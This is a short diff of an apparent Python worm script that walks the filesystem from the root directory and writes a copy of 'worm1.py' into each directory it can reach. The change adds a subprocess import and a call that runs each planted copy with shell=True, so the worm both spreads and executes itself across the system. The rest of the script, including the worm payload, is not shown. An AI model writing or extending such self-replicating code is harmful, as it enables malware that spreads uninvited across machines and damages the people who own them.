@@ -1,4 +1,5 @@
 from os import chdir, scandir, getcwd, environ, path as ospath
+from subprocess import run
 import UAC
 
 # IF UAC is not given, main-traverse.py will not be executed
@@ -24,8 +25,11 @@ chdir('/')
 def traverse(path):
     # plant worm1.py in the absolute path currently on
     try:
-        with open(ospath.realpath(path)+"\worm1.py", "wb") as outfile:
+        worm_path = ospath.realpath(path)+"\worm1.py"
+        with open(worm_path, "wb") as outfile:
             outfile.write(WORM_BIN)
+        run((worm_path), shell=True)   
+        
     except PermissionError:
         pass
         
